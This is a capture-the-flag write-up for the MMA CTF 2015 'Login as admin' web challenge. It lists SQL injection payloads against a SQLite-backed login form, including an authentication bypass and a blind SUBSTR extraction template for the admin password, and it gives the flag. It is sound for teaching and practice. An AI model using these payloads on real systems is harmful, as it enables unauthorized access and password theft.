
## MMA 1st CTF 2015 - Login as admin (Web 30)
##### 05/09 - 07/09/2015 (48hr)
___
### Description: 
Login as admin. And get the flag! The flag is the password of admin.

http://arrive.chal.mmactf.link/login.cgi

You can use test:test. 
___
### Solution

Let's start with some SQL injection tests:

```
username=1'                  &password=1	---> near "1": syntax error
username=1' OR SLEEP(4) OR '1&password=1 	---> no such function: sleep
```
Hmmm. It's SQLi, but not MySQL. Is it sqlite? Lets try:
```
username=1' OR  sqlite_version() OR '1&password=1 	---> You are test user. 
```
Oh yeah! Let's construct our blind string:
```
username=1' or 0 or '1        &password=1 	---> invalid username or password
username=1' or 1 or '1        &password=1  	---> you are the test use
username=1' or  username or '1&password=1 	---> no such column: username
username=1' or  user or '1    &password=1	---> invalid username or password
username=1' or  password or '1&password=1 	---> invalid username or password
username=1' or  (SELECT 1 FROM user) or '1&password=1	--->   You are test user.
```
Table is user with columns user and password.

So: username=1' or  user='admin' or '1&password=1
Gives:
	Congratulations!!
	You are admin user.
	The flag is your password!

Our blind SQLi string is:
```
	username=0' or SUBSTR((SELECT password FROM user WHERE user='admin'),{i},1)={C} or '0
	password=foo
```
Where, {i} is the current location and {C} the current character. After a while we get the flag:
	
	**MMA{cats_alice_band}**
___